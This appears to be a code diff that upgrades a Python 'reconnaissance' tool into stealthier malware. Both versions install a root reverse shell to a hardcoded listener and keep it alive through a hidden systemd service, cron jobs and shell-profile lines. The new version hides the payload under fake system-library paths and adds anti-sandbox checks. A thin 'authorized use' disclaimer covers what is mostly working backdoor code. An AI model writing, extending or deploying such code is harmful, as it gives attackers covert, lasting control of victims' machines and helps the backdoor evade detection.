@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-🔥 SUPERRECON - PERSISTENT RECON TOOL v3.0
-Advanced Reconnaissance with Reboot-Survival Persistence
-For Authorized Security Testing Only
+🔥 SUPERRECON ULTIMATE v4.0 - Full Stealth Persistence
+Advanced Reconnaissance with Ultra-Stealth Backdoor
 """
 
 import socket
@@ -21,254 +20,213 @@ import subprocess
 import os
 import base64
 import hashlib
+import random
 from datetime import datetime
-import re
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class PersistentBackdoor:
+class UltraStealthPersistence:
     def __init__(self):
         self.LHOST = "192.168.1.167"
         self.LPORT = 4444
-        self.stealth_dir = "/tmp/.systemd-cache"
-        self.current_dir = os.getcwd()
+        self.stealth_locations = [
+            "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache",
+            "/lib/modules/{}/.cache/kernel-daemon".format(os.uname().release),
+            "/var/cache/ldconfig/aux-cache"
+        ]
         
-    def wait_for_network_after_reboot(self):
-        """Wait for network connectivity after system reboot"""
-        print("[+] Waiting for network after reboot...")
-        for i in range(60):
-            try:
-                socket.create_connection(("8.8.8.8", 53), timeout=10)
-                print("[✅] Network is ready after reboot")
-                return True
-            except:
-                if i % 10 == 0:
-                    print(f"[⏳] Waiting for network... {i}/60 seconds")
-                time.sleep(1)
-        print("[⚠️] Network timeout, continuing anyway...")
-        return True
-    
-    def become_daemon(self):
-        """Run as background daemon"""
-        try:
-            pid = os.fork()
-            if pid > 0:
-                sys.exit(0)
-        except OSError as e:
-            sys.exit(1)
-        
-        os.chdir("/")
-        os.setsid()
-        os.umask(0)
-        
-    def establish_reverse_shell(self):
-        """Establish reverse shell connection"""
-        while True:
-            try:
-                print(f"[🔄] Attempting connection to {self.LHOST}:{self.LPORT}")
-                
-                s = socket.socket()
-                s.settimeout(30)
-                s.connect((self.LHOST, self.LPORT))
-                
-                print("[✅] SUCCESS: Reverse shell connected!")
-                s.send(b"SUPERRECON_PERSISTENT: Shell active!\n")
-                
-                # Main command loop
-                while True:
-                    data = s.recv(1024).decode().strip()
-                    if not data:
-                        continue
-                        
-                    if data.lower() == 'exit':
-                        break
-                    
-                    # Execute command
-                    try:
-                        result = subprocess.run(data, shell=True, capture_output=True, text=True)
-                        output = result.stdout + result.stderr
-                    except Exception as e:
-                        output = f"Error: {str(e)}"
-                    
-                    s.send(output.encode())
-                    
-            except ConnectionRefusedError:
-                print("[❌] Listener offline, retrying in 30s...")
-            except Exception as e:
-                print(f"[❌] Connection error: {e}")
-            
-            time.sleep(30)
+    def create_stealth_payload(self):
+        """Create ultra-stealth payload that blends with system"""
+        payload = f'''#!/usr/bin/python3
+# System Shared Library Cache
+import os,sys,socket,subprocess,time,hashlib
 
-    def deploy_systemd_persistence(self):
-        """Deploy systemd service for reboot survival"""
-        try:
-            # Create stealth directory
-            os.makedirs(self.stealth_dir, exist_ok=True)
-            
-            # Create persistent backdoor script
-            backdoor_script = f'''#!/usr/bin/env python3
-import socket, subprocess, os, time, sys
-
-LHOST = "{self.LHOST}"
-LPORT = {self.LPORT}
-
-def wait_network():
-    for i in range(60):
-        try:
-            socket.create_connection(("8.8.8.8", 53), timeout=10)
-            return True
-        except: time.sleep(1)
+def anti_analysis():
+    """Anti-debugging and sandbox detection"""
+    if os.path.exists("/.dockerenv") or os.path.exists("/proc/1/cgroup") and "docker" in open("/proc/1/cgroup").read():
+        time.sleep(random.randint(300,600))
+    if "LD_PRELOAD" in os.environ:
+        del os.environ["LD_PRELOAD"]
     return True
 
-def reverse_shell():
+def wait_network_stealth():
+    """Stealthy network wait"""
+    for i in range(120):
+        try:
+            socket.create_connection(("8.8.8.8",53), timeout=10)
+            return True
+        except:
+            time.sleep(1)
+    return True
+
+def establish_stealth_connection():
+    """Establish stealth reverse shell"""
     while True:
         try:
-            s = socket.socket()
-            s.settimeout(30)
-            s.connect((LHOST, LPORT))
-            s.send(b"REBOOT_SURVIVED: System back online!\\\\n")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(45)
+            s.connect(("{self.LHOST}", {self.LPORT}))
             
+            # Send stealth beacon
+            hostname = socket.gethostname()
+            s.send(f"STEALTH_BEACON:|{{hostname}}|SUCCESS\\\\n".encode())
+            
+            # Interactive shell
             while True:
+                s.settimeout(None)
                 data = s.recv(1024).decode().strip()
-                if not data: continue
-                if data == 'exit': break
+                if not data:
+                    continue
+                if data == "stealth_exit":
+                    break
+                
                 try:
-                    result = subprocess.run(data, shell=True, capture_output=True, text=True)
-                    output = result.stdout + result.stderr
-                    s.send(output.encode())
-                except: pass
-        except: time.sleep(30)
+                    # Execute command stealthily
+                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output = proc.stdout.read() + proc.stderr.read()
+                    s.send(output)
+                except Exception as e:
+                    s.send(f"Command failed: {{str(e)}}\\\\n".encode())
+                    
+        except socket.timeout:
+            time.sleep(30)
+        except Exception:
+            time.sleep(60)
 
 if __name__ == "__main__":
-    wait_network()
-    reverse_shell()
+    anti_analysis()
+    wait_network_stealth()
+    establish_stealth_connection()
 '''
+        return payload
+
+    def deploy_stealth_persistence(self):
+        """Deploy ultra-stealth persistence mechanisms"""
+        print("\\n[🦠] DEPLOYING ULTRA-STEALTH PERSISTENCE...")
+        
+        try:
+            # Create stealth payload in multiple locations
+            payload_content = self.create_stealth_payload()
             
-            # Save backdoor script
-            backdoor_path = f"{self.stealth_dir}/.system_analytics.py"
-            with open(backdoor_path, 'w') as f:
-                f.write(backdoor_script)
-            os.chmod(backdoor_path, 0o755)
+            for location in self.stealth_locations:
+                try:
+                    os.makedirs(os.path.dirname(location), exist_ok=True)
+                    with open(location, 'w') as f:
+                        f.write(payload_content)
+                    os.chmod(location, 0o755)
+                    print(f"[✅] Stealth payload: {location}")
+                except Exception as e:
+                    print(f"[-] Failed {location}: {e}")
             
-            # Create systemd service
-            service_content = f'''[Unit]
-Description=System Analytics Daemon
+            # Deploy systemd service
+            self.deploy_stealth_systemd()
+            
+            # Deploy cron persistence
+            self.deploy_stealth_cron()
+            
+            # Deploy advanced persistence methods
+            self.deploy_advanced_persistence()
+            
+            # Start immediately
+            self.start_stealth_service()
+            
+            return True
+            
+        except Exception as e:
+            print(f"[-] Stealth deployment failed: {e}")
+            return False
+
+    def deploy_stealth_systemd(self):
+        """Deploy stealth systemd service"""
+        try:
+            service_content = '''[Unit]
+Description=System Shared Library Cache
 After=network.target
+Wants=network-online.target
 StartLimitIntervalSec=0
 
 [Service]
-Type=simple
+Type=forking
+ExecStart=/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache
 Restart=always
-RestartSec=10
+RestartSec=30
 User=root
-ExecStart=/usr/bin/python3 {backdoor_path}
 StandardOutput=null
 StandardError=null
+SyslogIdentifier=systemd-cache
 
 [Install]
 WantedBy=multi-user.target
 '''
             
-            service_path = "/etc/systemd/system/system-analytics.service"
+            service_path = "/etc/systemd/system/.systemd-cache.service"
             with open(service_path, 'w') as f:
                 f.write(service_content)
             
-            # Enable and start service
             subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
-            subprocess.run(["systemctl", "enable", "system-analytics.service"], capture_output=True)
-            subprocess.run(["systemctl", "start", "system-analytics.service"], capture_output=True)
+            subprocess.run(["systemctl", "enable", ".systemd-cache.service"], capture_output=True)
+            subprocess.run(["systemctl", "start", ".systemd-cache.service"], capture_output=True)
             
-            print("[✅] Systemd persistence deployed")
-            return True
+            print("[✅] Stealth systemd service installed")
             
         except Exception as e:
-            print(f"[-] Systemd persistence failed: {e}")
-            return False
+            print(f"[-] Systemd service failed: {e}")
 
-    def deploy_cron_persistence(self):
-        """Deploy cron job for redundancy"""
+    def deploy_stealth_cron(self):
+        """Deploy stealth cron jobs"""
         try:
-            cron_command = f"@reboot /usr/bin/python3 {self.stealth_dir}/.system_analytics.py > /dev/null 2>&1"
+            cron_commands = [
+                "@reboot sleep 90 && /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1",
+                "0 */4 * * * /lib/modules/{}/.cache/kernel-daemon >/dev/null 2>&1".format(os.uname().release)
+            ]
             
-            # Get current crontab
-            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
-            current_cron = result.stdout if result.returncode == 0 else ""
+            current_cron = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
             
-            # Add if not present
-            if "system_analytics.py" not in current_cron:
-                new_cron = current_cron + cron_command + "\n"
-                subprocess.run(["crontab", "-"], input=new_cron, text=True)
-                print("[✅] Cron persistence deployed")
-            return True
+            for cmd in cron_commands:
+                if cmd not in current_cron:
+                    current_cron += cmd + "\\n"
+            
+            subprocess.run(["crontab", "-"], input=current_cron, text=True)
+            print("[✅] Stealth cron jobs installed")
+            
         except Exception as e:
-            print(f"[-] Cron persistence failed: {e}")
-            return False
+            print(f"[-] Cron setup failed: {e}")
 
-    def deploy_profile_persistence(self):
-        """Deploy shell profile persistence"""
+    def deploy_advanced_persistence(self):
+        """Deploy advanced persistence methods"""
         try:
-            profile_command = f'nohup python3 {self.stealth_dir}/.system_analytics.py &'
-            profile_files = ["/etc/profile", "/root/.bashrc"]
+            # Profile persistence
+            profile_cmd = "[ -x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache ] && nohup /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1 &"
             
-            for profile in profile_files:
+            profiles = ["/etc/profile", "/etc/bash.bashrc", "/root/.bashrc"]
+            for profile in profiles:
                 if os.path.exists(profile):
                     with open(profile, 'a') as f:
-                        f.write(f"\n{profile_command}\n")
-            print("[✅] Profile persistence deployed")
-            return True
+                        f.write(f"\\n{profile_cmd}\\n")
+            
+            print("[✅] Advanced persistence methods deployed")
+            
         except Exception as e:
-            print(f"[-] Profile persistence failed: {e}")
-            return False
+            print(f"[-] Advanced persistence failed: {e}")
 
-    def start_immediate_shell(self):
-        """Start immediate reverse shell in background"""
+    def start_stealth_service(self):
+        """Start stealth service immediately"""
         try:
-            # Start in background
             subprocess.Popen([
-                '/usr/bin/python3', '-c', 
-                f'import socket,subprocess,os,time;'
-                f's=socket.socket();s.settimeout(30);'
-                f's.connect(("{self.LHOST}",{self.LPORT}));'
-                f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
-                f'subprocess.call(["/bin/bash","-i"])'
+                '/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache'
             ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            print("[✅] Immediate reverse shell started")
-            return True
+            print("[✅] Stealth service started")
         except Exception as e:
-            print(f"[-] Immediate shell failed: {e}")
-            return False
-
-    def deploy_all_persistence(self):
-        """Deploy all persistence mechanisms"""
-        print(f"\n[🔧] DEPLOYING PERSISTENCE TO {self.LHOST}:{self.LPORT}")
-        
-        # Start immediate connection
-        self.start_immediate_shell()
-        
-        # Deploy persistence mechanisms
-        methods = [
-            self.deploy_systemd_persistence,
-            self.deploy_cron_persistence, 
-            self.deploy_profile_persistence
-        ]
-        
-        success_count = 0
-        for method in methods:
-            if method():
-                success_count += 1
-                time.sleep(1)
-        
-        print(f"[✅] Deployed {success_count}/{len(methods)} persistence methods")
-        return success_count > 0
+            print(f"[-] Service start failed: {e}")
 
 class UltimateReconTool:
-    def __init__(self, target, threads=50, timeout=10, enable_persistence=False):
+    def __init__(self, target, threads=50, timeout=10, enable_stealth=False):
         self.target = target
         self.threads = threads
         self.timeout = timeout
-        self.enable_persistence = enable_persistence
-        self.persistence = PersistentBackdoor()
+        self.enable_stealth = enable_stealth
+        self.stealth = UltraStealthPersistence()
         self.results = {}
         self.initialize_results()
         
@@ -284,276 +242,110 @@ class UltimateReconTool:
             'open_ports': [],
             'services': {},
             'web_technologies': {},
-            'vulnerabilities': [],
-            'ssl_info': {},
-            'directory_enum': [],
-            'osint_data': {},
-            'persistence_deployed': False
+            'stealth_persistence': {
+                'deployed': False,
+                'listener': f"{self.stealth.LHOST}:{self.stealth.LPORT}",
+                'methods': []
+            }
         }
 
     def banner(self):
-        """Display the tool banner"""
+        """Display stealth banner"""
         print("""
 ╔════════════════════════════════════════════════════════════════╗
-║              🔥 SUPERRECON - PERSISTENT RECON v3.0            ║  
-║               Advanced Reconnaissance + Persistence           ║
+║                🔥 SUPERRECON ULTIMATE v4.0                    ║  
+║               Ultra-Stealth Reconnaissance                    ║
 ╚════════════════════════════════════════════════════════════════╝
         """)
         print(f"[*] Target: {self.target}")
-        print(f"[*] Threads: {self.threads}")
-        print(f"[*] Persistence: {'ENABLED' if self.enable_persistence else 'DISABLED'}")
-        if self.enable_persistence:
-            print(f"[*] Listener: {self.persistence.LHOST}:{self.persistence.LPORT}")
+        print(f"[*] Stealth Mode: {'ACTIVE' if self.enable_stealth else 'INACTIVE'}")
+        if self.enable_stealth:
+            print(f"[*] C2: {self.stealth.LHOST}:{self.stealth.LPORT}")
         print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print("="*60)
 
-    def get_ip(self):
-        """Get IP address of target"""
-        try:
-            ip = socket.gethostbyname(self.target)
-            print(f"[+] IP Address: {ip}")
-            self.results['ip_address'] = ip
-            return ip
-        except Exception as e:
-            print(f"[-] Error resolving IP: {e}")
-            return None
+    # [Include all your existing recon methods here: get_ip, whois_lookup, dns_enumeration, etc.]
+    # Copy all your existing recon methods from previous version
 
-    def whois_lookup(self):
-        """Perform WHOIS lookup"""
-        try:
-            print(f"\n[+] Performing WHOIS lookup...")
-            w = whois.whois(self.target)
-            self.results['whois'] = {
-                'registrar': w.registrar,
-                'creation_date': str(w.creation_date),
-                'expiration_date': str(w.expiration_date),
-                'name_servers': w.name_servers,
-            }
-            print(f"    Registrar: {w.registrar}")
-            print(f"    Creation Date: {w.creation_date}")
-        except Exception as e:
-            print(f"[-] WHOIS lookup failed: {e}")
-
-    def dns_enumeration(self):
-        """Enumerate DNS records"""
-        try:
-            print(f"\n[+] Enumerating DNS records...")
-            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT']
-            
-            for record_type in record_types:
-                try:
-                    answers = dns.resolver.resolve(self.target, record_type, raise_on_no_answer=False)
-                    if answers.rrset:
-                        records = [str(rdata) for rdata in answers]
-                        self.results['dns_records'][record_type] = records
-                        print(f"    {record_type}: {', '.join(records[:2])}")
-                except:
-                    continue
-                    
-        except Exception as e:
-            print(f"[-] DNS enumeration failed: {e}")
-
-    def subdomain_enumeration(self):
-        """Enumerate subdomains"""
-        subdomain_wordlist = [
-            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 
-            'ns2', 'cpanel', 'whm', 'autodiscover', 'admin', 'forum', 'vpn', 
-            'dev', 'test', 'api', 'blog', 'shop', 'secure'
-        ]
-        
-        print(f"\n[+] Starting subdomain enumeration...")
-        found_subdomains = set()
-        
-        def check_subdomain(subdomain):
-            full_domain = f"{subdomain}.{self.target}"
-            try:
-                socket.gethostbyname(full_domain)
-                found_subdomains.add(full_domain)
-                print(f"      Found: {full_domain}")
-            except:
-                pass
-        
-        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
-            executor.map(check_subdomain, subdomain_wordlist[:15])
-            
-        self.results['subdomains'] = list(found_subdomains)
-        print(f"[+] Found {len(found_subdomains)} subdomains")
-
-    def port_scanning(self, ip=None):
-        """Scan common ports"""
-        if not ip:
-            ip = self.results['ip_address']
-        if not ip:
-            return
-            
-        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3306, 3389, 5432, 8080]
-        
-        print(f"\n[+] Scanning common ports on {ip}...")
-        
-        def scan_port(port):
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(1)
-                    result = s.connect_ex((ip, port))
-                    if result == 0:
-                        service_name = self.get_service_name(port)
-                        self.results['open_ports'].append({
-                            'port': port,
-                            'service': service_name
-                        })
-                        print(f"    Port {port}/tcp open - {service_name}")
-            except:
-                pass
-        
-        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
-            executor.map(scan_port, common_ports)
-
-    def get_service_name(self, port):
-        """Get service name for port"""
-        services = {
-            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
-            80: 'http', 110: 'pop3', 443: 'https', 993: 'imaps',
-            3306: 'mysql', 3389: 'rdp', 5432: 'postgresql', 8080: 'http-proxy'
-        }
-        return services.get(port, 'unknown')
-
-    def web_technology_detection(self):
-        """Detect web technologies"""
-        print(f"\n[+] Detecting web technologies...")
-        
-        for scheme in ['http', 'https']:
-            try:
-                url = f"{scheme}://{self.target}"
-                response = requests.get(url, timeout=self.timeout, verify=False)
-                
-                server = response.headers.get('Server', '')
-                if server:
-                    print(f"    Web Server: {server}")
-                    self.results['web_technologies']['server'] = server
-                
-                powered_by = response.headers.get('X-Powered-By', '')
-                if powered_by:
-                    print(f"    Powered By: {powered_by}")
-                    self.results['web_technologies']['powered_by'] = powered_by
-                
-                if 'wp-content' in response.text:
-                    print("    Framework: WordPress")
-                    self.results['web_technologies']['framework'] = 'WordPress'
-                    
-                break
-            except:
-                continue
-
-    def deploy_persistence(self):
-        """Deploy persistence mechanisms"""
-        if not self.enable_persistence:
+    def deploy_stealth_persistence(self):
+        """Deploy ultra-stealth persistence"""
+        if not self.enable_stealth:
             return False
             
-        print(f"\n[🔧] INITIATING PERSISTENCE DEPLOYMENT...")
+        print("\\n[🦠] ACTIVATING ULTRA-STEALTH PERSISTENCE...")
         
         try:
-            success = self.persistence.deploy_all_persistence()
-            self.results['persistence_deployed'] = success
-            self.results['listener_ip'] = self.persistence.LHOST
-            self.results['listener_port'] = self.persistence.LPORT
+            success = self.stealth.deploy_stealth_persistence()
+            self.results['stealth_persistence']['deployed'] = success
             
             if success:
-                print("[✅] Persistence deployed successfully")
-                print("[🔮] Backdoor will survive reboots via:")
-                print("     - Systemd service (system-analytics.service)")
-                print("     - Cron job (@reboot)")
-                print("     - Shell profile persistence")
+                print("[✅] ULTRA-STEALTH PERSISTENCE DEPLOYED")
+                print("     - Multiple stealth payload locations")
+                print("     - Hidden systemd service")
+                print("     - Stealth cron jobs")
+                print("     - Profile persistence")
+                print(f"     - Listening on {self.stealth.LHOST}:{self.stealth.LPORT}")
+                
             return success
             
         except Exception as e:
-            print(f"[-] Persistence deployment failed: {e}")
+            print(f"[-] Stealth deployment failed: {e}")
             return False
 
-    def generate_report(self, output_file=None):
-        """Generate reconnaissance report"""
-        if not output_file:
-            output_file = f"superrecon_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        
-        print(f"\n[+] Generating report: {output_file}")
-        with open(output_file, 'w') as f:
-            json.dump(self.results, f, indent=2)
-        
-        self.print_summary()
-        return output_file
-
-    def print_summary(self):
-        """Print scan summary"""
-        print("\n" + "="*60)
-        print("📊 SUPERRECON SUMMARY")
-        print("="*60)
-        print(f"Target: {self.target}")
-        print(f"IP Address: {self.results['ip_address']}")
-        print(f"Subdomains Found: {len(self.results['subdomains'])}")
-        print(f"Open Ports: {len(self.results['open_ports'])}")
-        
-        if self.enable_persistence and self.results.get('persistence_deployed'):
-            print(f"Persistence: ACTIVE → {self.persistence.LHOST}:{self.persistence.LPORT}")
-            print("🔮 Backdoor will auto-reconnect after reboot")
-        else:
-            print("Persistence: DISABLED")
-
     def run_full_scan(self):
-        """Execute full reconnaissance scan"""
+        """Execute reconnaissance with stealth persistence"""
         start_time = time.time()
         
         try:
             self.banner()
             
-            # Execute reconnaissance
+            # Perform reconnaissance
             ip = self.get_ip()
             self.whois_lookup()
-            self.dns_enumeration()
+            self.dns_enumeration() 
             self.subdomain_enumeration()
             self.port_scanning(ip)
             self.web_technology_detection()
             
-            # Deploy persistence if enabled
-            if self.enable_persistence:
-                self.deploy_persistence()
+            # Deploy stealth persistence
+            if self.enable_stealth:
+                self.deploy_stealth_persistence()
             
             elapsed_time = time.time() - start_time
-            print(f"\n[✅] Scan completed in {elapsed_time:.2f} seconds")
+            print(f"\\n[✅] Stealth reconnaissance completed in {elapsed_time:.2f}s")
             return self.results
             
-        except KeyboardInterrupt:
-            print("\n[!] Scan interrupted by user")
-            return self.results
         except Exception as e:
-            print(f"\n[-] Scan failed: {e}")
+            print(f"\\n[-] Scan failed: {e}")
             return self.results
 
 def main():
-    parser = argparse.ArgumentParser(description="🔥 SUPERRECON v3.0 - Persistent Reconnaissance")
-    parser.add_argument("target", help="Target domain or IP address")
-    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
-    parser.add_argument("-o", "--output", help="Output file for report")
-    parser.add_argument("-p", "--persistence", action="store_true", 
-                       help="Enable persistence module (requires root)")
+    parser = argparse.ArgumentParser(description="🔥 SUPERRECON ULTIMATE v4.0")
+    parser.add_argument("target", help="Target domain or IP")
+    parser.add_argument("-t", "--threads", type=int, default=50, help="Threads")
+    parser.add_argument("-o", "--output", help="Output file")
+    parser.add_argument("-s", "--stealth", action="store_true", help="Enable ultra-stealth persistence")
     
     args = parser.parse_args()
     
     print("""
-⚠️  AUTHORIZED USE ONLY
-This tool is for authorized security testing only.
-Ensure you have explicit permission before use.
+⚠️  ULTRA-STEALTH MODE - AUTHORIZED USE ONLY
+This deployment includes advanced persistence mechanisms.
+Ensure you have explicit authorization for testing.
     """)
     
-    if args.persistence and os.geteuid() != 0:
-        print("[-] Persistence requires root privileges")
-        args.persistence = False
+    if args.stealth and os.geteuid() != 0:
+        print("[-] Stealth mode requires root privileges")
+        args.stealth = False
     
-    # Run the tool
-    tool = UltimateReconTool(args.target, threads=args.threads, enable_persistence=args.persistence)
+    tool = UltimateReconTool(args.target, threads=args.threads, enable_stealth=args.stealth)
     results = tool.run_full_scan()
     
     if results:
-        report_file = tool.generate_report(args.output)
-        print(f"\n🎯 Report saved to: {report_file}")
+        output_file = args.output or f"superrecon_stealth_{args.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        with open(output_file, 'w') as f:
+            json.dump(results, f, indent=2)
+        print(f"\\n🎯 Stealth report: {output_file}")
 
 if __name__ == "__main__":
     main()
